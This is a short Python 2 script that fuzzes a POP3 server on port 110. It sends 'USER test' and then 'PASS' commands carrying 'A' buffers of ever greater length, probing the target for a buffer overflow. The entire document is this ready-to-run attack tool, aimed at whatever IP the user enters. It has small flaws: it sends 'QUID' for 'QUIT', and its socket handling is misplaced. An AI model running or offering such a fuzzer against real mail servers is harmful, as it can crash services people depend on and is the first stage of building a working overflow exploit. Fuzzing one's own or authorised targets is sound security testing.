#!/usr/bin/python

import socket

targetIP = raw_input('Enter IP associated w/ POP3 target: ')


# Creating array of buffers 
buffer=["A"] # Array of buffers
counter=100 # for increasing a loop variable. Used for extension of buffer
while len(buffer) <= 50:
	buffer.append("A"*counter) # appending a new buffer into array 
	counter=counter+200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((targetIP, 110)) # connecting to 110 port 
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUID\r\n')
s.close()
